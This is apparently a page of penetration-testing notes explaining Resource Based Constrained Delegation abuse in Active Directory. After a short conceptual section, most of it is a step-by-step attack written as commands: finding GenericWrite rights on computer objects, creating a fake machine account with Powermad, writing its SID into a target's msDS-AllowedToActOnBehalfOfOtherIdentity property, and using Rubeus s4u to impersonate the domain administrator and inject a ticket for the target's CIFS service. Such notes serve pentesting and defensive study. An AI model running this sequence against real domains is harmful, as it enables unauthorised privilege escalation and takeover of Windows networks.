# Resource Based Constrained Delegation \(RBCD\)

## Resource Based Constrained Delegation \(RBCD\)

RBCD needs to happen from a computer account or a service account with a SPN.  
  
Attack can be done if a frontend service has a SID configured into the msDS- AllowedToActOnBehalfOfOtherIdentity property backend service.  
  
  
**msDSAllowedToActOnBehalfOfOtherIdentity** property controls delegation from the backend service  
  
To turn RBCD on, we need to write the SID frontend into a new propriety of the backend service.  
  
 → SeEnableDelegationPrivilege permissions are not required  
 → RBCD can typically be configured by the backend service administrator instead  
 → the frontend service must have an SPN set in the domain &gt; Computer Account  
  
  
S4U2Self forwardable TGS for any user to itself followed by S4U2Proxy to create a TGS for that user to the backend service.  
  
The KDC checks if the SID of the frontend service is present in the msDS-AllowedToActOnBehalfOfOtherIdentity property of the backend service.

### **Attack Path** 

* Compromise a domain account which have genericwrite on a computer account object.
* Add a new computer machine and force a password on it  \(user can add up to 10 computers by default\)

{% hint style="warning" %}
GenericAll, WriteProperty, GenericWrite or WriteDACL can be used to add change the SID on a computer object
{% endhint %}

Constrained Delegation Requirements :  
  
- Constrained Delegation = SPN on the frontend service \(msDSAllowedToDelegateTo propriety\)  
- SeEnableDelegationPrivilege priv

### Enumeration

#### Find GenericWrite access on a Computer Object

```csharp
 Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

![](../../../../.gitbook/assets/image%20%28105%29.png)

#### Computer Domain Join 

```csharp
 Get-DomainObject -Identity badcorp.local  -Properties ms-DS-MachineAccountQuota
```

![](../../../../.gitbook/assets/image%20%28142%29.png)

### Create a new machine account

#### Load powermad

```text
New-MachineAccount -MachineAccount fakeComputer -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

![](../../../../.gitbook/assets/image%20%28293%29.png)

![](../../../../.gitbook/assets/image%20%285%29.png)

msDS-AllowedToActOnBehalfOfOtherIdentity property stores the SID as part of a security descriptor in a binary format which needs to be converted.

```csharp
$sid =Get-DomainComputer -Identity fakeComputer1 -Properties objectsid | Select -Expand objectsid
```

![](../../../../.gitbook/assets/image%20%28257%29%20%281%29.png)

* Instantiate a SecurityDescriptor object using RawSecurityDescriptor Class:

```csharp
$SecDesc = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
```

![](../../../../.gitbook/assets/image%20%28102%29.png)

* convert it into a byte array to match the format for the msDS-AllowedToActOnBehalfOfOtherIdentity property:

```csharp
$sdFormat = New-Object byte[] ($SecDesc.BinaryLength)
$SecDesc.GetBinaryForm($sdFormat,0)
```

#### Abuse GenericWrite on the target server

```csharp
 Get-DomainComputer -Identity targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdFormat}
 $RBCD  = Get-DomainComputer targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
 $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCD, 0
 $Descriptor.DiscretionaryAcl
```

![](../../../../.gitbook/assets/image%20%28118%29.png)

### Get a TGS using the fakeComputer account

#### Rubeus

```csharp
.\Rubeus.exe hash /password:Password123
.\Rubeus.exe s4u /user:fakeComputer /rc4:58A478135A93AC3BF058A5EA0E8FDB71  /impersonateuser:administrator /msdsspn:CIFS/targetServer.test.lab.local /ptt
```

![](../../../../.gitbook/assets/image%20%28246%29.png)

### Resources

{% embed url="https://github.com/Kevin-Robertson/Powermad" %}

{% embed url="https://github.com/GhostPack/Rubeus" %}







